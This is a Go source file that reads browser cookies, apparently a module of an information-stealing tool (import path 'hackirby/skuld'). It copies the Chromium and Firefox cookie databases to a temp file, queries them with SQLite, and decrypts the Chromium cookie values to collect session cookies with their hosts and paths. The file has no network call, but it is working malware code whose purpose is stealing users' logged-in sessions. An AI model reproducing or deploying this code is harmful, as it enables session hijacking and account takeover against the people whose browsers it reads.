package browsers

import (
	"database/sql"
	"os"
	"path/filepath"

	"github.com/hackirby/skuld/utils/fileutil"
	_ "modernc.org/sqlite"
)

func (c *Chromium) GetCookies(path string) (cookies []Cookie, err error) {
	tempPath := filepath.Join(os.TempDir(), "cookie_db")
	err = fileutil.CopyFile(filepath.Join(path, "Cookies"), tempPath)
	if err != nil {
		return nil, err
	}

	db, err := sql.Open("sqlite", tempPath)
	if err != nil {
		return nil, err
	}

	rows, err := db.Query("SELECT name, encrypted_value, host_key, path, expires_utc FROM cookies")
	if err != nil {
		return nil, err
	}
	defer rows.Close()

	for rows.Next() {
		var (
			name, host, path       string
			encrypted_value, value []byte
			expires_utc            int64
		)
		if err = rows.Scan(&name, &encrypted_value, &host, &path, &expires_utc); err != nil {
			continue
		}

		if name == "" || host == "" || path == "" || encrypted_value == nil {
			continue
		}

		cookie := Cookie{
			Name:       name,
			Host:       host,
			Path:       path,
			ExpireDate: expires_utc,
		}

		value, err = c.Decrypt(encrypted_value)
		if err != nil {
			continue
		}
		cookie.Value = string(value)
		cookies = append(cookies, cookie)
	}

	return cookies, nil
}

func (g *Gecko) GetCookies(path string) (cookies []Cookie, err error) {
	tempPath := filepath.Join(os.TempDir(), "cookie_db")
	err = fileutil.CopyFile(filepath.Join(path, "cookies.sqlite"), tempPath)
	if err != nil {
		return nil, err
	}

	db, err := sql.Open("sqlite", tempPath)
	if err != nil {
		return nil, err
	}

	defer os.Remove(tempPath)
	defer db.Close()

	rows, err := db.Query("SELECT name, value, host, path, expiry FROM moz_cookies")
	if err != nil {
		return nil, err
	}

	defer rows.Close()

	for rows.Next() {
		var (
			name, host, path string
			value            []byte
			expiry           int64
		)
		if err = rows.Scan(&name, &value, &host, &path, &expiry); err != nil {
			continue
		}

		if name == "" || host == "" || path == "" || value == nil {
			continue
		}

		cookie := Cookie{
			Name:       name,
			Host:       host,
			Path:       path,
			ExpireDate: expiry,
			Value:      string(value),
		}
		cookies = append(cookies, cookie)
	}

	return cookies, nil
}
